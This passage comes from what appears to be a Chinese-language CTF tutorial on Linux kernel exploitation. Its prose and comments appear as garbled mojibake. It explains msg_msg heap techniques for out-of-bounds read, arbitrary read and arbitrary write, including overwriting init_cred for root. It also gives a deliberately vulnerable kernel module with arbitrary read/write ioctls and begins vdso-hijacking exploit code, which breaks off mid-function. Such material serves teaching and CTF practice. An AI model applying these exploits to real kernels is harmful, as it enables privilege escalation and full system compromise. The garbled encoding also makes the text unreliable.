msg_msg *copy;\n            \n            copy = load_msg(buf, bufsz);\n            if (!IS_ERR(copy))\n                copy->m_ts = bufsz;\n            return copy;\n        }\n        */\n        if (IS_ERR(copy))\n            return PTR_ERR(copy);\n    }\n    //è¿™æ ·å°±ä¸ä¼šå°†msg_msgä»msg_queueæ¶ˆæ¯é˜Ÿåˆ—ä¸­è¿›è¡ŒUnlinkæ‘˜é™¤\n    //åªæ˜¯é‡Šæ”¾å †å—,åœ¨åç»­çš„ä»£ç ä¸­æœ‰æ˜¾ç¤º\n    //......\n    //å¼€å§‹ä»msg_queueä¸­å¯»æ‰¾åˆé€‚çš„msg_msg\n    for (;;) {\n        //.....\n        msg = find_msg(msq, &msgtyp, mode);\n        if (!IS_ERR(msg)) {\n            /*\n\t\t\t * Found a suitable message.\n\t\t\t * Unlink it from the queue.\n\t\t\t */\n            //æœ€å¥½è®¾ç½®MSG_NOERRORæ ‡å¿—ä½,è¿™æ ·è¯·æ±‚è·å–æ¶ˆæ¯é•¿åº¦å°äºm_tsç¨‹åºä¹Ÿä¸ä¼šé€€å‡ºäº†\n            if ((bufsz < msg->m_ts) && !(msgflg & MSG_NOERROR)) {\n                msg = ERR_PTR(-E2BIG);\n                goto out_unlock0;\n            }\n            /*\n\t\t\t * If we are copying, then do not unlink message and do\n\t\t\t * not update queue parameters.\n\t\t\t */\n            //è®¾ç½®äº†MSG_COPYæ ‡å¿—ä½å°±ä¼šå°†msgæ•°æ®å¤åˆ¶ç»™copy,ç„¶åå°†copyèµ‹ç»™msg\n            if (msgflg & MSG_COPY) {\n                //è¿™ä¸ªcopy_msg()å‡½æ•°å°±æ˜¯ä¹‹å‰æåˆ°çš„åœ¨æ±‡ç¼–å±‚é¢å°±å¾ˆå¥‡æ€ª\n                msg = copy_msg(msg, copy);\n                goto out_unlock0;\n            }\n\n            //ä¸‹é¢æ˜¯å°†msg_msgä»å’Œmsg_queueç»„æˆçš„åŒå‘å¾ªç¯é“¾è¡¨ä¸­unlinkå‡ºæ¥çš„éƒ¨åˆ†\n            list_del(&msg->m_list);\n            msq->q_qnum--;\n            msq->q_rtime = ktime_get_real_seconds();\n            ipc_update_pid(&msq->q_lrpid, task_tgid(current));\n            msq->q_cbytes -= msg->m_ts;\n            atomic_sub(msg->m_ts, &ns->msg_bytes);\n            atomic_dec(&ns->msg_hdrs);\n            ss_wakeup(msq, &wake_q, false);\n\n            goto out_unlock0;\n        }\n        //....\n    }\n\nout_unlock0:\n    ipc_unlock_object(&msq->q_perm);\n    wake_up_q(&wake_q);\nout_unlock1:\n    rcu_read_unlock();\n    //å¦‚æœå­˜åœ¨copyå‰¯æœ¬,é‚£ä¹ˆå°±freeæ‰copyå‰¯æœ¬,ç„¶åè¿”å›,è€Œä¸ä¼šfreeæ‰åŸæœ¬çš„msgå †å—\n    if (IS_ERR(msg)) {\n        free_copy(copy);\n        return PTR_ERR(msg);\n    }\n    //è¿™ä¸ªmsg_handlerå‡½æ•°æŒ‡é’ˆå³ä¸ºä¼ å…¥çš„do_msg_fill()å‡½æ•°,ä»é‡Œé¢è¿›è¡Œç›¸å…³çš„æ•°æ®å¤åˆ¶\n    bufsz = msg_handler(buf, msg, bufsz);\n    //æœ€ååœ¨è¿™é‡Œè¿›è¡Œç›¸å…³å †å—çš„é‡Šæ”¾\n    free_msg(msg);\n\n    return bufsz;\n}\n\n```\n\n##### A.éå †å—é‡Šæ”¾çš„æ•°æ®è¯»å–\n\nä¸€èˆ¬è€Œè¨€ï¼Œæˆ‘ä»¬ä½¿ç”¨`msg_msg`è¿›è¡Œå †æ„é€ ï¼ˆæ¯”å¦‚æº¢å‡ºæˆ–è€…å…¶ä»–ä»€ä¹ˆçš„ï¼‰çš„æ—¶å€™ï¼Œå½“éœ€è¦ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯è€Œåˆä¸æƒ³é‡Šæ”¾è¯¥å †å—æ—¶ï¼Œä¼šç»“åˆ`MSG_COPY`è¿™ä¸ª`msgflg`æ ‡å¿—ä½ï¼Œé˜²æ­¢åœ¨è¯»å–çš„æ—¶å€™å‘ç”Ÿå †å—é‡Šæ”¾ä»è€Œè¿›è¡ŒåŒå‘å¾ªç¯é“¾è¡¨çš„`unlink`è§¦å‘é”™è¯¯ã€‚\n\n```c\n//v5.11 do_msgrcv()å‡½æ•°ä¸­çš„\n/* If we are copying, then do not unlink message and do\n    * not update queue parameters.\n    */\nif (msgflg & MSG_COPY) {\n    msg = copy_msg(msg, copy);\n    goto out_unlock0;\n}\n\n//ä¸‹é¢æ˜¯unlinkçš„éƒ¨åˆ†,å¦‚æœmsg_msgç»“æ„è¢«ä¿®æ”¹äº†å¯èƒ½ä¼šå‡ºé”™çš„\nlist_del(&msg->m_list);\nmsq->q_qnum--;\nmsq->q_rtime = ktime_get_real_seconds();\nipc_update_pid(&msq->q_lrpid, task_tgid(current));\nmsq->q_cbytes -= msg->m_ts;\natomic_sub(msg->m_ts, &ns->msg_bytes);\natomic_dec(&ns->msg_hdrs);\nss_wakeup(msq, &wake_q, false);\n\ngoto out_unlock0;\n```\n\nä½¿ç”¨è¿™ä¸ªæ ‡å¿—ä½è¿˜éœ€è¦åœ¨å†…æ ¸ç¼–è¯‘çš„æ—¶å€™è®¾ç½®`CONFIG_CHECKPOINT_RESTORE=y`æ‰è¡Œï¼Œå¦åˆ™è¿˜æ˜¯ä¼šå‡ºé”™çš„\n\n```c\n//v5.11 /ipc/msgutil.c\n#ifdef CONFIG_CHECKPOINT_RESTORE\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\t//æ­£å¸¸çš„ä¸€äº›æ•°æ®å¤åˆ¶\n}\n#else\n//å¦‚æœæ²¡æœ‰è®¾ç½®CONFIG_CHECKPOINT_RESTORE=yåˆ™ä¼šå‡ºé”™\nstruct msg_msg *copy_msg(struct msg_msg *src, struct msg_msg *dst)\n{\n\treturn ERR_PTR(-ENOSYS);\n}\n#endif\n```\n\nğŸ”ºæ³¨ï¼šè¿˜æœ‰ä¸€ç‚¹ä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»€ä¹ˆbugï¼Œåœ¨æŸäº›å†…æ ¸ç‰ˆæœ¬ä¸­ï¼Œè‡³å°‘æˆ‘çš„`v5.11`ä¸­ï¼Œ`MSG_NOERROR`å’Œ`MSG_COPY`ï¼ˆåç»­ä¼šè®²åˆ°ï¼‰æ²¡æœ‰åŠæ³•åŒæ—¶ç”Ÿæ•ˆï¼Œå…³é”®ç‚¹åœ¨äº`copy_msg()`å‡½æ•°ä¸­ï¼Œè½¬åŒ–æˆæ±‡ç¼–å¦‚ä¸‹ï¼š\n\n![image-20220512163536660](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220512163536660.png)\n\næ³¨æ„åˆ°çº¢æ¡†çš„éƒ¨åˆ†ï¼Œè·å–`rdi(msg)`å’Œ`rsi(copy)`å¯¹åº”çš„`m_ts`è¿›è¡Œæ¯”è¾ƒï¼Œè€Œ`copy`çš„`m_ts`æ˜¯ä»ç”¨æˆ·ä¼ è¿›æ¥çš„æƒ³è¦è·å–æ¶ˆæ¯çš„é•¿åº¦ï¼Œå¦‚æœå°äºå®é™…çš„`msg`çš„`m_ts`é•¿åº¦ï¼Œé‚£å°±æ ‡è®°é”™è¯¯ç„¶åé€€å‡ºã€‚å¯ä»¥è¿™ä¸ªæ¯”è¾ƒåº”è¯¥æ˜¯åœ¨åé¢æ‰ä¼šè¿›è¡Œçš„ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿçªç„¶å†’å‡ºæ¥ï¼Œå°±å¾ˆå¥‡æ€ªï¼Œå¯¼è‡´è¿™ä¸¤ä¸ªæ ‡å¿—ä½æ²¡åŠæ³•åŒæ—¶å‘æŒ¥ä½œç”¨ã€‚\n\n##### B.é‡Šæ”¾å †å—çš„æ¶ˆæ¯è¯»å–\n\nåŒç†å¦‚æœä¸æŒ‡å®š`MSG_COPY`è¿™ä¸ªæ ‡å¿—æ—¶ï¼Œä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–æ¶ˆæ¯å°±ä¼šè§¦å‘å†…å­˜é‡Šæ”¾ï¼Œè¿™é‡Œå°±å¯ä»¥ä¾æ®å‘é€æ¶ˆæ¯æ—¶è®¾ç½®çš„`mtype`å’Œæ¥æ”¶æ¶ˆæ¯æ—¶è®¾ç½®çš„`msgtpy`æ¥è¿›è¡Œæ¶ˆæ¯é˜Ÿåˆ—ä¸­å„ä¸ªä½ç½®çš„å †å—çš„é‡Šæ”¾ã€‚\n\n##### C.æ•°æ®å¤åˆ¶\n\nä¸ç®¡ä»€ä¹ˆæ ‡å¿—ä½ï¼Œåªè¦ä¸æ˜¯`MSG_NOERROR`å’Œ`MSG_COPY`è”åˆèµ·æ¥ï¼Œå¹¶ä¸”ç”³è¯·è¯»å–æ¶ˆæ¯é•¿åº¦`size`å°äºé€šè¿‡`find_msg()`å‡½æ•°è·å–åˆ°çš„å®é™…æ¶ˆæ¯çš„`m_ts`ï¼Œé‚£ä¹ˆæœ€ç»ˆéƒ½ä¼šèµ°åˆ°do_msgrcv()å‡½æ•°çš„æœ«å°¾ï¼Œé€šè¿‡å¦‚ä¸‹ä»£ç è¿›è¡Œæ•°æ®å¤åˆ¶å’Œå †å—é‡Šæ”¾\n\n```c\nbufsz = msg_handler(buf, msg, bufsz);\nfree_msg(msg);\n```\n\n### (3)åˆ©ç”¨\n\n#### è¶Šç•Œè¯»å–\n\nè¿™æ ·ï¼Œå½“æˆ‘ä»¬é€šè¿‡ä¹‹å‰æåˆ°çš„`double-free/UAF`ï¼Œå¹¶ä¸”å†ä½¿ç”¨`setxattr`æ¥å¯¹`msg_msgmsg`ä¸­çš„`m_ts`è¿›è¡Œä¿®æ”¹ï¼Œè¿™æ ·åœ¨æˆ‘ä»¬è°ƒç”¨`msgrcv`çš„æ—¶å€™å°±èƒ½è¶Šç•Œä»å †ä¸Šè¯»å–å†…å­˜äº†ï¼Œå°±å¯èƒ½èƒ½å¤Ÿæ³„éœ²åˆ°å †åœ°å€æˆ–è€…ç¨‹åºåŸºåœ°å€ã€‚\n\n**ä½¿ç”¨`setxattr`çš„æ—¶å€™éœ€è¦æ³¨æ„é‡Šæ”¾å †å—æ—¶FDçš„ä½ç½®ï¼Œä¸åŒå†…æ ¸ç‰ˆæœ¬å¼€å¯ä¸åŒä¿æŠ¤ä¸‹FDçš„ä½ç½®ä¸å¤ªä¸€æ ·**\n\nä¸ºäº†è·å–åˆ°åœ°å€çš„æˆåŠŸæ€§æ›´å¤§ï¼Œæˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°å•ä¸ª`msg_queue`å’Œå•ä¸ª`msg_msg`çš„å†…å­˜æ¨¡å‹\n\n![image-20220511113542467](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220511113542467.png)\n\nå¯ä»¥çœ‹åˆ°å•ä¸ª`msg_msg`åœ¨`msg_queue`çš„ç®¡ç†ä¸‹å½¢æˆåŒå‘å¾ªç¯é“¾è¡¨ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬é€šè¿‡`msgget`å’Œ`msgsnd`å¤šç”³è¯·ä¸€äº›ç›¸åŒå¤§å°çš„ä¸”åªæœ‰ä¸€ä¸ª`msg_msg`ç»“æ„ä½“çš„`msg_queue`ï¼Œé‚£ä¹ˆè¶Šç•Œè¯»å–çš„æ—¶å€™ï¼Œå°±å¯ä»¥è¯»å–åˆ°åªæœ‰å•ä¸ª`msg_msg`çš„å¤´éƒ¨äº†\n\nè€Œå•ä¸ª`msg_msg`ç”±äºåŒå‘å¾ªç¯é“¾è¡¨ï¼Œå…¶å¤´éƒ¨ä¸­åˆå­˜åœ¨æŒ‡å‘`msg_queue`çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆè¿™æ ·å°±èƒ½æ³„éœ²å‡º`msg_queue`çš„å †åœ°å€äº†ã€‚\n\n\n\n#### ä»»æ„è¯»å–\n\nå®Œæˆä¸Šè¿°æ³„éœ²`msg_queue`çš„å †åœ°å€ä¹‹åï¼Œå°±éœ€è¦ç”¨åˆ°`msg_msg`çš„å†…å­˜å¸ƒå±€äº†\n\nç”±äºæˆ‘ä»¬çš„`msg_msg`æ¶ˆæ¯çš„å†…å­˜å¸ƒå±€å¦‚ä¸‹\n\n![5IcVxRaFQtg3HCW](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203122041731.png)\n\nç›¸å…³è¯»å–æºç å¦‚ä¸‹ï¼š\n\n```c\n//v4.9----ipc/msgutil.c\n#define DATALEN_MSG\t((size_t)PAGE_SIZE-sizeof(struct msg_msg))\n#define DATALEN_SEG\t((size_t)PAGE_SIZE-sizeof(struct msg_msgseg))\n----------------------------------------------------------------\nint store_msg(void __user *dest, struct msg_msg *msg, size_t len)\n{\n\tsize_t alen;\n\tstruct msg_msgseg *seg;\n\n\talen = min(len, DATALEN_MSG);\n\tif (copy_to_user(dest, msg + 1, alen))\n\t\treturn -1;\n\n\tfor (seg = msg->next; seg != NULL; seg = seg->next) {\n\t\tlen -= alen;\n\t\tdest = (char __user *)dest + alen;\n\t\talen = min(len, DATALEN_SEG);\n\t\tif (copy_to_user(dest, seg + 1, alen))\n\t\t\treturn -1;\n\t}\n\treturn 0;\n}\n```\n\næ‰€ä»¥å¦‚æœæˆ‘ä»¬å¯ä»¥ä¿®æ”¹`next`æŒ‡é’ˆå’Œ`m_ts`ï¼Œç»“åˆè¯»å–`msg`æœ€ç»ˆè°ƒç”¨å‡½æ•°`store_msg`çš„æºç ï¼Œé‚£ä¹ˆå°±èƒ½å¤Ÿå®ç°ä»»æ„è¯»å–ã€‚\n\né‚£ä¹ˆæ¥ç€ä¸Šé¢çš„ï¼Œæˆ‘ä»¬å¾—åˆ°`msg_queue`ä¹‹åï¼Œå¯ä»¥å†å°†`msg_msg`çš„nextæŒ‡é’ˆæŒ‡å›`msg_queue`ï¼Œè¯»å‡ºå…¶ä¸­çš„`msg_msg`ï¼Œå°±èƒ½è·å¾—å½“å‰å¯æ§å †å—çš„å †åœ°å€ã€‚\n\nè¿™æ ·å®Œæˆä¹‹åï¼Œæˆ‘ä»¬ç»“åˆ`userfaultfd`å’Œ`setxattr`é¢‘ç¹ä¿®æ”¹nextæŒ‡é’ˆå°±èƒ½åŸºäºå½“å‰å †åœ°å€æ¥è¿›è¡Œå†…å­˜æœç´¢äº†ï¼Œä»è€Œèƒ½å¤Ÿå®Œæˆåœ°å€æ³„éœ²ã€‚\n\nåŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåˆ¤æ–­é“¾è¡¨æ˜¯å¦ç»“æŸçš„ä¾æ®ä¸ºnextæ˜¯å¦ä¸ºnullï¼Œæ‰€ä»¥æˆ‘ä»¬ä»»æ„è¯»å–çš„æ—¶å€™ï¼Œæœ€å¥½æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹çš„nextæŒ‡é’ˆå¤„çš„å€¼ä¸ºnullã€‚\n\n#### ä»»æ„å†™\n\nåŒæ ·çš„ï¼Œ`msg_msg`ç”±äºnextæŒ‡é’ˆçš„å­˜åœ¨ï¼Œç»“åˆ`msgsnd`ä¹Ÿå…·å¤‡ä»»æ„åœ°å€å†™çš„åŠŸèƒ½ã€‚æˆ‘ä»¬å¯ä»¥åœ¨æ‹·è´çš„æ—¶å€™åˆ©ç”¨`userfaultfd`åœä¸‹æ¥ï¼Œç„¶åæ›´æ”¹nextæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚`init_cred`ç»“æ„ä½“ä½ç½®ï¼Œä»è€Œç›´æ¥ä¿®æ”¹è¿›è¡Œææƒã€‚\n\n\n\n\n\n# äºŒã€ä»»æ„è¯»å†™æ¼æ´\n\nå†…æ ¸é‡Œçš„è¯»å†™æ¼æ´åˆ©ç”¨æ–¹å¼ä¸ç”¨æˆ·æ€æœ‰ç‚¹ä¸å¤ªä¸€æ ·ï¼Œåˆ©ç”¨æ–¹å¼ä¹Ÿæ˜¯å¤šç§å¤šæ ·ã€‚\n\n## é¢˜ç›®\n\né¦–å…ˆç»™å‡ºä¸‹é¢˜ç›®\n\n```c\n#include <linux/module.h>\n#include <linux/version.h>\n#include <linux/kernel.h>\n#include <linux/types.h>\n#include <linux/kdev_t.h>\n#include <linux/fs.h>\n#include <linux/device.h>\n#include <linux/cdev.h>\n#include <asm/uaccess.h>\n#include <linux/slab.h>\n\n//è®¾å¤‡é©±åŠ¨å¸¸ç”¨å˜é‡\n//static char *buffer_var = NULL;\nstatic char *buffer_var = NULL;\nstatic struct class *devClass; // Global variable for the device class\nstatic struct cdev cdev;\nstatic dev_t arbWriteModule_dev_no;\n\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\n\n\nstatic struct arbWriteNote* arbNoteObj;\n\n\n\nstatic long arbWriteModule_ioctl(struct file *filp, unsigned int cmd, unsigned long arg);\n\nstatic int arbWriteModule_open(struct inode *i, struct file *f);\n\nstatic int arbWriteModule_close(struct inode *i, struct file *f);\n\n\n\nstatic struct file_operations arbWriteModule_fops =\n        {\n                .owner = THIS_MODULE,\n                .open = arbWriteModule_open,\n                .release = arbWriteModule_close,\n                .unlocked_ioctl = arbWriteModule_ioctl\n        };\n\n// è®¾å¤‡é©±åŠ¨æ¨¡å—åŠ è½½å‡½æ•°\nstatic int __init arbWriteModule_init(void)\n{\n    printk(KERN_INFO \"[i] Module arbWriteModule registered\");\n    if (alloc_chrdev_region(&arbWriteModule_dev_no, 0, 1, \"arbWriteModule\") < 0)\n    {\n        return -1;\n    }\n    if ((devClass = class_create(THIS_MODULE, \"chardrv\")) == NULL)\n    {\n        unregister_chrdev_region(arbWriteModule_dev_no, 1);\n        return -1;\n    }\n    if (device_create(devClass, NULL, arbWriteModule_dev_no, NULL, \"arbWriteModule\") == NULL)\n    {\n        printk(KERN_INFO \"[i] Module arbWriteModule error\");\n        class_destroy(devClass);\n        unregister_chrdev_region(arbWriteModule_dev_no, 1);\n        return -1;\n    }\n    cdev_init(&cdev, &arbWriteModule_fops);\n    if (cdev_add(&cdev, arbWriteModule_dev_no, 1) == -1)\n    {\n        device_destroy(devClass, arbWriteModule_dev_no);\n        class_destroy(devClass);\n        unregister_chrdev_region(arbWriteModule_dev_no, 1);\n        return -1;\n    }\n\n    printk(KERN_INFO \"[i] <Major, Minor>: <%d, %d>\\n\", MAJOR(arbWriteModule_dev_no), MINOR(arbWriteModule_dev_no));\n    return 0;\n\n}\n\n// è®¾å¤‡é©±åŠ¨æ¨¡å—å¸è½½å‡½æ•°\nstatic void __exit arbWriteModule_exit(void)\n{\n    // é‡Šæ”¾å ç”¨çš„è®¾å¤‡å·\n    unregister_chrdev_region(arbWriteModule_dev_no, 1);\n    cdev_del(&cdev);\n}\n\n\n\n\n// ioctlå‡½æ•°å‘½ä»¤æ§åˆ¶\nlong arbWriteModule_ioctl(struct file *filp, unsigned int cmd, unsigned long arg)\n{\n    char* chunk = NULL;\n    char* buf;\n    int retval = 0;\n    switch (cmd) {\n        case 111: //arbRead\n            printk(\"Arbitrarily read function!---111\\n\");\n            arbNoteObj = (struct arbWriteNote*)arg;\n            copy_to_user(arbNoteObj->data,(char*)arbNoteObj->addr,arbNoteObj->len);\n            break;\n\n        case 222: //arbWrite\n            printk(\"Arbitrarily write function!---222\\n\");\n            arbNoteObj = (struct arbWriteNote*)arg;\n            buf = kmalloc(arbNoteObj->len,GFP_KERNEL);\n            copy_from_user(buf,arbNoteObj->data,arbNoteObj->len);\n            memcpy((char*)arbNoteObj->addr,buf,arbNoteObj->len);\n            kfree(buf);\n            break;\n\n\n        default:\n            retval = -1;\n            break;\n    }    \n    \n    return retval;\n\n}\n\n\nstatic int arbWriteModule_open(struct inode *i, struct file *f)\n{\n    printk(KERN_INFO \"[i] Module arbWriteModule: open()\\n\");\n    return 0;\n}\n\nstatic int arbWriteModule_close(struct inode *i, struct file *f)\n{\n    //kfree(buffer_var);\n    //buffer_var = NULL;\n    printk(KERN_INFO \"[i] Module arbWriteModule: close()\\n\");\n    return 0;\n}\n\nmodule_init(arbWriteModule_init);\nmodule_exit(arbWriteModule_exit);\n\nMODULE_LICENSE(\"GPL\");\n// MODULE_AUTHOR(\"blackndoor\");\n// MODULE_DESCRIPTION(\"Module vuln overflow\");\n\n\n```\n\nå¯ä»¥çœ‹åˆ°ä¼ å…¥ä¸€ä¸ªç»“æ„ä½“ï¼ŒåŒ…å«æ•°æ®æŒ‡é’ˆå’Œåœ°å€ï¼Œç›´æ¥ä»»æ„è¯»å†™ã€‚\n\n## ä¸åŒåŠ«æŒ\n\n### 1.åŠ«æŒvdso\n\n#### (1)å‰ç½®çŸ¥è¯†\n\nvdsoçš„ä»£ç æ•°æ®åœ¨å†…æ ¸é‡Œï¼Œå½“ç¨‹åºéœ€è¦ä½¿ç”¨æ—¶ï¼Œä¼šå°†vdsoçš„å†…æ ¸æ˜ å°„ç»™è¿›ç¨‹ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæŠŠå†…æ ¸ç©ºé—´çš„vdsoåŸå°ä¸åŠ¨åœ°å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼Œç„¶åè°ƒç”¨åœ¨ç”¨æˆ·ç©ºé—´çš„vdsoä»£ç ã€‚\n\nå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿå°†vdsoç»™åŠ«æŒä¸ºshellcodeï¼Œé‚£ä¹ˆå½“å…·æœ‰rootæƒé™çš„ç¨‹åºè°ƒç”¨vdsoæ—¶ï¼Œå°±ä¼šè§¦å‘æˆ‘ä»¬çš„shellcodeï¼Œè€Œå…·æœ‰rootæƒé™çš„shellcodeå¯æƒ³è€ŒçŸ¥ç›´æ¥å°±å¯ä»¥ã€‚è€Œvdsoæ˜¯ç»å¸¸ä¼šè¢«è°ƒç”¨çš„ï¼Œæ‰€æœ‰åªè¦æˆ‘ä»¬åŠ«æŒäº†vdsoï¼Œå¤§æ¦‚ç‡éƒ½ä¼šè¿è¡Œåˆ°æˆ‘ä»¬çš„shellcodeã€‚\n\nçœŸå®ç¯å¢ƒä¸­crontabä¼šè°ƒç”¨vdsoä¸­çš„gettimeofdayï¼Œä¸”æ˜¯rootæƒé™çš„è°ƒç”¨ã€‚\n\nè€Œctfé¢˜ç›®ä¸­å°±é€šå¸¸å¯ä»¥ç”¨ä¸€ä¸ªå°ç¨‹åºæ¥æ¨¡æ‹Ÿè°ƒç”¨ã€‚\n\n```C\n#include <stdio.h>  \n\nint main(){  \n    while(1)\n    {  \n        sleep(1);  \n        gettimeofday();  \n    }  \n}\n```\n\nå°†è¿™ä¸ªç¨‹åºç¼–è¯‘åæ”¾åˆ°initä¸­ï¼Œç”¨nohupæŒ‚èµ·ï¼Œå³å¯åšåˆ°rootæƒé™è°ƒç”¨gettimeofdayï¼š\n\n```bash\nnohup /gettimeofday &\n```\n\n#### (2)è·å–åœ°å€\n\nç”±äºä¸åŒç‰ˆæœ¬çš„linuxå†…æ ¸ä¸­çš„vdsoåç§»ä¸åŒï¼Œè€Œé¢˜ç›®ç»™çš„vmlinuxé€šå¸¸åˆæ²¡æœ‰ç¬¦å·è¡¨ï¼Œæ‰€ä»¥éœ€è¦æˆ‘ä»¬è‡ªå·±åˆ©ç”¨ä»»æ„è¯»æ¼æ´æ¥æµ‹é‡ã€‚(å¦‚æœé¢˜ç›®æ²¡æœ‰ä»»æ„è¯»æ¼æ´ï¼Œå»ºè®®å¯ä»¥è‡ªå·±ç¼–è¯‘ä¸€ä¸ªå¯¹åº”ç‰ˆæœ¬çš„å†…æ ¸ï¼Œç„¶åè‡ªå·±å†™ä¸€ä¸ªå…·å¤‡ä»»æ„è¯»çš„æ¨¡å—ï¼ŒåŠ è½½ä¹‹åæµ‹é‡å³å¯ï¼Œæˆ–è€…è¿›è¡Œçˆ†ç ´ï¼Œä¸€èˆ¬éœ€è¦çˆ†ç ´ä¸€ä¸ªåŠå­—èŠ‚)\n\nä¾‹å¦‚è¿™é‡Œç»™å‡ºçš„ä»£ç ç¤ºä¾‹ï¼Œå°±å¯ä»¥é€šè¿‡å¦‚ä¸‹ä»£ç æ¥å°†vdsoä»å†…æ ¸ä¸­dumpä¸‹æ¥ã€‚ä¸è¿‡è¿™ç§æ–¹å¼dumpçš„æ˜¯æ˜ å°„åˆ°ç”¨æˆ·ç¨‹åºçš„vdsoï¼Œè™½ç„¶å†…å®¹æ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡vdsoåœ¨å†…æ ¸ä¸­çš„åç§»å´æ²¡æœ‰åŠæ³•ç¡®å®šã€‚\n\n```C\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <fcntl.h>\n#include <sys/auxv.h> \n#include <sys/mman.h>\n\nint main(){\n    int test;\n    size_t result=0;\n    unsigned long sysinfo_ehdr = getauxval(AT_SYSINFO_EHDR);\n    result=memmem(sysinfo_ehdr,0x1000,\"gettimeofday\",12);\n    printf(\"[+]VDSO : %p\\n\",sysinfo_ehdr);\n    printf(\"[+]The offset of gettimeofday is : %x\\n\",result-sysinfo_ehdr);\n    scanf(\"Wait! %d\", test);  \n    /* \n    gdb break point at 0x400A36\n    and then dump memory\n    why only dump 0x1000 ???\n    */\n    if (sysinfo_ehdr!=0){\n        for (int i=0;i<0x2000;i+=1){\n            printf(\"%02x \",*(unsigned char *)(sysinfo_ehdr+i));\n        }\n    }\n}\n```\n\nè¿™ç§æ–¹æ³•çš„åŸç†æ˜¯é€šè¿‡å¯»æ‰¾gettimeofdayå­—ç¬¦ä¸²æ¥å¾—åˆ°æ˜ å°„åˆ°ç¨‹åºä¸­çš„vdsoçš„å†…å­˜é¡µï¼Œå¦‚ä¸‹ï¼š\n\n![image-20211020150011934](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150019.png)\n\nä¹‹åæŠŠä¸‹é¢çš„å†…å®¹éƒ½å¤åˆ¶ï¼Œæ”¾åˆ°CyberChefä¸­ï¼Œåˆ©ç”¨From HexåŠŸèƒ½å¾—åˆ°äºŒè¿›åˆ¶æ–‡ä»¶\n\n![image-20211020150220448](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150220.png)\n\nç„¶åå°±å°†å¾—åˆ°çš„æ–‡ä»¶æ”¾åˆ°IDAä¸­ï¼Œå³å¯è‡ªåŠ¨è§£æåˆ°å¯¹åº”gettimeofdayå‡½æ•°ç›¸å¯¹äºvdsoçš„å‡½æ•°åç§»ã€‚\n\n![image-20211020150335000](https://pig-007.oss-cn-beijing.aliyuncs.com/img/20211020150335.png)\n\nè¿™é‡Œå°±å½“æ˜¯0xb20ã€‚\n\nä¹‹åé€šè¿‡ä»»æ„è¯»ï¼Œç±»ä¼¼åŸºäºæœ¬é¢˜ç¼–å†™çš„ä»¥ä¸‹ä»£ç ï¼Œè·å–vdsoç›¸å¯¹äºvmlinuxåŸºå€çš„åç§»ã€‚\n\n```C\n#include <string.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/stat.h>\n#include <sys/ioctl.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <sys/mman.h>\n#include <assert.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/prctl.h>\n#include <sys/time.h>\n#include <sys/auxv.h>\n\n\nstruct arbWriteNote\n{\n    ssize_t addr;\n    ssize_t len;\n    char* data;\n};\nstruct arbWriteNote arbWriteObj;\nint get_gettimeofday_str_offset();\n\nint main(int argc, char *argv[])\n{\n    int gettimeofday_str_offset = get_gettimeofday_str_offset();\n    printf(\"gettimeofday str in vdso.so offset=0x%x\\n\",gettimeofday_str_offset);\n    size_t vdso_addr = -1;\n    for (size_t addr=0xffffffff80000000;addr < 0xffffffffffffefff;addr += 0x1000) {\n        //è¯»å–ä¸€é¡µæ•°æ®\n        arbitrary_read(devFD,0x1000,buf,addr);\n        //å¦‚æœåœ¨å¯¹åº”çš„åç§»å¤„ï¼Œæ­£å¥½æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½ç¡®å®šå½“å‰å°±æ˜¯vdsoçš„åœ°å€\n        //ä¹‹æ‰€ä»¥èƒ½ç¡®å®šï¼Œæ˜¯å› ä¸ºæˆ‘ä»¬æ¯æ¬¡è¯»å–äº†0x1000å­—èŠ‚æ•°æ®ï¼Œä¹Ÿå°±æ˜¯1é¡µï¼Œè€Œvdsoçš„æ˜ å°„ä¹Ÿåªæ˜¯1é¡µ\n        if (!strcmp(buf+gettimeofday_str_offset,\"gettimeofday\")) {\n            printf(\"[+]find vdso.so!!\\n\");\n            vdso_addr = addr;\n            printf(\"[+]vdso in kernel addr=0x%lx\\n\",vdso_addr);\n            break;\n        }\n    }\n}\n\n//è·å–vdsoé‡Œçš„å­—ç¬¦ä¸²\"gettimeofday\"ç›¸å¯¹vdso.soçš„åç§»\nint get_gettimeofday_str_offset() {\n    //è·å–å½“å‰ç¨‹åºçš„vdso.soåŠ è½½åœ°å€0x7ffxxxxxxxx\n    size_t vdso_addr = getauxval(AT_SYSINFO_EHDR);\n    char* name = \"gettimeofday\";\n    if (!vdso_addr) {\n        printf(\"[-]error get name's offset\\n\");\n    }\n    //ä»…éœ€è¦æœç´¢1é¡µå¤§å°å³å¯ï¼Œå› ä¸ºvdsoæ˜ å°„å°±ä¸€é¡µ0x1000\n    size_t name_addr = memmem(vdso_addr, 0x1000, name, strlen(name));\n    if (name_addr < 0) {\n        printf(\"[-]error get name's offset\\n\");\n    }\n    return 